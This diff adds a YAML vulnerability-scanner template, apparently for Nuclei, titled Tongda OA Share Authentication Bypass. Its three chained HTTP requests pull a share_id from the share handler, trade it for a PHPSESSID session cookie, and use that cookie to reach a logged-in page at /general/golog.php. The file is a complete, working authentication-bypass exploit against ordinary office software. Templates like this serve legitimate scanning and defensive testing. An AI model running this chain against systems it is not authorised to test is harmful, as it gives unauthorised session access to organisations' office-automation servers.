@@ -1,0 +1,54 @@
+id: poc-tongda-oa-share-authentication-bypass
+info:
+  name: Tongda OA Share Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+http:
+  - raw:
+      - |
+        GET /share/handle.php?module=2&module_id=1 HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: share_id
+        part: body
+        internal: true
+        regex:
+          - "share_id=(.*?)\""
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "share_id="
+  - raw:
+      - |
+        GET /share/index.php?share_id={{share_id}} HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        internal: true
+        regex:
+          - "PHPSESSID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 302
+  - raw:
+      - |
+        GET /general/golog.php?version=ie6 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{session_cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "images/golog/ie.png"
+          - "images/golog/spirit_icon.png"
